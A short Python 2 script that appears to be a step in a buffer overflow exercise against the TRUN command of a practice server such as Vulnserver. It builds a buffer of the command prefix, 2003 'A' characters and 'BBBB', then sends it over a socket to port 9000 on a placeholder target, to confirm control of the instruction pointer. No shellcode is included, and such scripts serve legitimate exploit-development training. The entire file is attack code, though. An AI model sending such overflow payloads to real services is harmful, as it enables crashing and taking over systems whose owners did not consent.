import sys, socket

buff = "TRUN /.:/"

buff += "A" * 2003

#sending "B" to check that the flow is controlled after 2003 "A"

buff += "BBBB"

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('Target ip',9000))
print s.recv(1024)
s.send(buff)
s.close()
